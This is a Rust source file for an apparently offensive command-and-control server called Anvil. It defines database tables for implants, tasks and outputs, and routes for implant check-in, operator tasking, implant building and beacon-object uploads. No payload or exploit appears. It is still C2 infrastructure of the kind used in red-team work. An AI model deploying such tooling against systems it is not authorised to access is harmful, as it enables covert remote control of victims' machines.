pub mod crypto;
pub mod routes;

use actix_web::{web, HttpRequest};
use bcrypt::{hash, DEFAULT_COST};
use base64::Engine as _;
use openssl::rand::rand_bytes;
use rusqlite::{params, Connection};
use std::io;
use std::path::Path;
use std::sync::{Arc, Mutex};

/// Operator credentials loaded from `config.toml`.
#[derive(Debug, Clone, serde::Deserialize)]
pub struct User {
    pub username: String,
    pub password: String,
}

/// Open (or create) SQLite and apply the same schema as production Anvil startup.
pub fn init_database(database_path: &Path, users: &[User]) -> io::Result<Arc<Mutex<Connection>>> {
    let db = Arc::new(Mutex::new(
        Connection::open(database_path).map_err(io::Error::other)?,
    ));
    let db_guard = db.lock().unwrap();

    db_guard
        .execute(
            "CREATE TABLE IF NOT EXISTS users (
              username TEXT PRIMARY KEY,
              password TEXT NOT NULL
          )",
            params![],
        )
        .map_err(io::Error::other)?;

    for user in users {
        let hashed_password = hash(&user.password, DEFAULT_COST).map_err(io::Error::other)?;
        db_guard
            .execute(
                "INSERT OR REPLACE INTO users (username, password) VALUES (?1, ?2)",
                params![user.username, hashed_password],
            )
            .map_err(io::Error::other)?;
    }

    db_guard
        .execute(
            "CREATE TABLE IF NOT EXISTS unique_identifiers (
              id TEXT PRIMARY KEY
          )",
            params![],
        )
        .map_err(io::Error::other)?;

    db_guard
        .execute(
            "CREATE TABLE IF NOT EXISTS imps (
                id INTEGER PRIMARY KEY,
                session TEXT NOT NULL,
                ip TEXT NOT NULL,
                username TEXT NOT NULL,
                domain TEXT NOT NULL,
                os TEXT NOT NULL,
                imp_pid TEXT NOT NULL,
                process_name TEXT NOT NULL,
                sleep TEXT NOT NULL,
                last_check_in TEXT NOT NULL
            )",
            params![],
        )
        .map_err(io::Error::other)?;

    db_guard
        .execute(
            "CREATE TABLE IF NOT EXISTS tokens (
              token TEXT PRIMARY KEY
          )",
            params![],
        )
        .map_err(io::Error::other)?;

    db_guard
        .execute(
            "CREATE TABLE IF NOT EXISTS tasks (
                token TEXT NOT NULL,
                task TEXT NOT NULL
            )",
            params![],
        )
        .map_err(io::Error::other)?;

    db_guard
        .execute(
            "CREATE TABLE IF NOT EXISTS imp_tokens (
                  token TEXT PRIMARY KEY
              )",
            params![],
        )
        .map_err(io::Error::other)?;

    db_guard
        .execute(
            "CREATE TABLE IF NOT EXISTS outputs (
                    id INTEGER PRIMARY KEY,
                    token TEXT NOT NULL,
                    task TEXT NOT NULL,
                    output TEXT NOT NULL
                )",
            params![],
        )
        .map_err(io::Error::other)?;

    drop(db_guard);
    Ok(db)
}

/// Per-app AES key material. Tests register this in app data so parallel tests do not race on `AES_KEY`.
#[derive(Clone)]
pub struct AesKey(pub String);

impl AesKey {
    pub fn from_request(req: &HttpRequest) -> Option<String> {
        req.app_data::<web::Data<AesKey>>()
            .map(|k| k.0.clone())
            .or_else(|| std::env::var("AES_KEY").ok())
    }
}

fn register_aes_key(cfg: &mut web::ServiceConfig, aes_key_b64: Option<String>) {
    if let Some(key) = aes_key_b64 {
        cfg.app_data(web::Data::new(AesKey(key)));
    }
}

/// Register implant-facing routes (plain HTTP in tests; production wraps these in TLS in `main`).
pub fn configure_implant_routes(
    cfg: &mut web::ServiceConfig,
    db: Arc<Mutex<Connection>>,
    aes_key_b64: Option<String>,
) {
    use actix_web::web::Data;
    cfg.app_data(Data::new(db));
    register_aes_key(cfg, aes_key_b64);
    cfg.route("/js", web::post().to(routes::check_in))
        .route("/index", web::post().to(routes::index))
        .route("/return_out", web::post().to(routes::return_out))
        .route("/download", web::get().to(routes::download_file));
}

/// Register operator-facing routes (plain HTTP in tests).
pub fn configure_conduit_routes(
    cfg: &mut web::ServiceConfig,
    db: Arc<Mutex<Connection>>,
    aes_key_b64: Option<String>,
) {
    use actix_web::web::Data;
    cfg.app_data(Data::new(db.clone()))
        .app_data(web::PayloadConfig::new(10 * 1024 * 1024));
    register_aes_key(cfg, aes_key_b64);
    cfg.route("/imps", web::get().to(routes::get_connected_imps))
        .route("/issue_task", web::post().to(routes::issue_task))
        .route("/authenticate", web::post().to(routes::authenticate))
        .route("/build_imp", web::post().to(routes::build_imp))
        .route("/retrieve_out", web::get().to(routes::retrieve_out))
        .route("/retrieve_all_out", web::get().to(routes::retrieve_all_out))
        .route("/bofload", web::post().to(routes::receive_chunk));
}

/// Generate a 256-bit AES key and return `(raw_bytes, url_safe_b64_no_pad)` for `AES_KEY`.
pub fn generate_aes_key_material() -> io::Result<(Vec<u8>, String)> {
    let mut aes_key = vec![0u8; 32];
    rand_bytes(&mut aes_key).map_err(|e| io::Error::new(io::ErrorKind::Other, e))?;
    let encoded = crypto::CUSTOM_B64.encode(&aes_key);
    Ok((aes_key, encoded))
}

pub fn load_aes_key_from_file(path: &Path) -> io::Result<Vec<u8>> {
    std::fs::read(path)
}

pub fn save_aes_key_to_file(key: &[u8], path: &Path) -> io::Result<()> {
    std::fs::write(path, key)
}
